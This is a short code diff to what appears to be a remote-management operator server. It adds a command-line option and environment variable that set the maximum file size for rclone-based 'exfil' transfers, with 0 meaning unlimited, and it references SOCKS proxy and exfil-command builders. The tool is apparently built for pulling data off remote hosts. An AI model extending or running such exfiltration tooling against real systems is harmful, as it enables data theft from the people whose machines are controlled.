@@ -42,7 +42,7 @@ from rmm_ws import OperatorEventHub, WebSocketConnection
 from rmm_socks import DEFAULT_SOCKS_PORT, DEFAULT_BIND_HOST, SocksManager
 from rmm_rclone import (
     RcloneConfigError,
-    RCLONE_MAX_BYTES,
+    get_rclone_max_bytes,
     RCLONE_BIN_PATH,
     DEFAULT_PROFILE,
     build_exfil_command,
@@ -1704,7 +1704,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                     "session_id": session.id,
                     "queued": cmd.split("\n", 1)[0],
                     "profile": profile,
-                    "max_bytes": RCLONE_MAX_BYTES,
+                    "max_bytes": get_rclone_max_bytes(),
                     "rclone": rclone_public_config(),
                 },
             )
@@ -2464,6 +2464,13 @@ def main():
         metavar="PATH",
         help="rclone exfil profiles JSON file (or set RMM_RCLONE_PROFILES_FILE)",
     )
+    parser.add_argument(
+        "--rclone-max-bytes",
+        default=None,
+        type=int,
+        metavar="N",
+        help="Max exfil file size in bytes; 0 = unlimited (or set RMM_RCLONE_MAX_BYTES)",
+    )
     args = parser.parse_args()
     PORT = args.port
     LISTEN_HOST = args.bind
@@ -2481,6 +2488,14 @@ def main():
             )
             sys.exit(1)
         os.environ["RMM_RCLONE_PROFILES_FILE"] = profiles_path
+    if args.rclone_max_bytes is not None:
+        if args.rclone_max_bytes < 0:
+            print(
+                f"{Colors.RED}[!] --rclone-max-bytes must be >= 0 (0 = unlimited){Colors.END}",
+                file=sys.stderr,
+            )
+            sys.exit(1)
+        os.environ["RMM_RCLONE_MAX_BYTES"] = str(args.rclone_max_bytes)
 
     if not INSECURE:
         if not API_TOKEN:
